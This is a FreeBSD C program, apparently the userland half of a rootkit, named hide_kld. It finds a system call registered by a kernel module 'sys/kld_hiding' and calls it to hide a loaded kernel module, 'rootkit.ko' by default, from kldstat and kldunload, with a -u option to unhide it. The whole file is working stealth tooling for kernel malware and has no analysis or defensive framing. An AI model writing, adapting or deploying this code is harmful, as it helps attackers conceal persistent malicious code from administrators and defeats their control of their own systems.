#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/syscall.h>
#include <unistd.h>

static int
find_syscall(const char *module_name)
{
    struct module_stat module_stat;
    int module_id;

    module_id = modfind(module_name);
    if (module_id == -1) {
        perror("modfind");
        return -1;
    }

    memset(&module_stat, 0, sizeof(module_stat));

    module_stat.version = sizeof(module_stat);
    if (modstat(module_id, &module_stat) == -1) {
        perror("modstat");
        return -1;
    }

    return module_stat.data.intval;
}

static void
usage(void)
{
    fprintf(stderr, "usage: hide_kld [-u] [module_name]\n");
    fprintf(stderr, "  no arguments  hide rootkit.ko\n");
    fprintf(stderr, "  -u            stop hiding, so kldstat and kldunload see it\n");
}

int
main(int argc, char **argv)
{
    const char *name = "rootkit.ko";
    int hide_module_syscall;
    int unhide = 0;
    int ch;

    while ((ch = getopt(argc, argv, "u")) != -1) {
        switch (ch) {
        case 'u':
            unhide = 1;
            break;
        default:
            usage();
            return 1;
        }
    }
    argc -= optind;
    argv += optind;

    if (argc > 1) {
        usage();
        return 1;
    }
    if (argc == 1)
        name = argv[0];

    hide_module_syscall = find_syscall("sys/kld_hiding");
    if (hide_module_syscall == -1) {
        /*
         * Not found usually means the module is already unloaded, which is
         * the state an uninstall is trying to reach; say so instead of
         * failing with a bare error.
         */
        fprintf(stderr, "hide_kld: sys/kld_hiding is not registered "
            "(module not loaded?)\n");
        return unhide ? 0 : 1;
    }

    if (syscall(hide_module_syscall, unhide ? "" : name) == -1) {
        perror(unhide ? "unhide" : "hide");
        return 1;
    }

    return 0;
}
